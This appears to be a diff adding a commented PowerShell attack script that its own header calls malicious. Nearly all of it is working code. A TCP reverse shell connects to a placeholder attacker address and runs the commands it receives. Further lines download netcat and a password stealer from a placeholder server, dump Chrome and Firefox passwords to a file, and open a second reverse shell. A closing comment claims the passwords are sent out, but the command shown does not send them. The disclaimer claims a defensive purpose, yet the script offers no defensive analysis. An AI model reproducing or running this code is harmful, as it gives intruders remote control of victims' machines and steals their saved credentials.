@@ -1,0 +1,47 @@
+# -------------------------------
+# Malicious PowerShell Script ⚠️
+# Reverse Shell + Browser Password Theft + Data Exfiltration
+# -------------------------------
+# 🚨 WARNING: Unauthorized use of this script is ILLEGAL.
+# This script is analyzed strictly for cybersecurity awareness and ethical hacking defense.
+# -------------------------------
+
+# INITIAL ACCESS - PowerShell Reverse Shell
+# This establishes a TCP connection back to the attacker's machine (YOUR_IP on port 4444)
+
+$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP', 4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | % {0}
+
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    # Decode the received command
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    
+    # Execute the received command and capture output
+    $sendback = (iex $data 2>&1 | Out-String)
+    
+    # Append current working directory for better interaction
+    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+    
+    # Convert output to bytes and send it back to the attacker
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+
+# ESCALATION - Download & Execute Password Stealer
+# This downloads and runs a tool to steal browser passwords (Chrome & Firefox)
+
+IWR -Uri "http://YOUR_SERVER/nc.exe" -OutFile "$env:TEMP\nc.exe"   # Download Netcat
+IWR -Uri "http://YOUR_SERVER/pass.exe" -OutFile "$env:TEMP\pass.exe"  # Download Password Stealer
+
+# Execute the password stealer silently and save output to a file
+& "$env:TEMP\pass.exe" -nogui -chrome -firefox > "$env:TEMP\loot.txt"
+
+#  EXFILTRATION - Send Stolen Data to the Attacker
+# Use Netcat to transfer the stolen passwords and open another reverse shell
+
+& "$env:TEMP\nc.exe" YOUR_IP 4445 -e cmd.exe  # Establish second reverse shell (port 4445)
+
+# -------------------------------
+# END OF SCRIPT
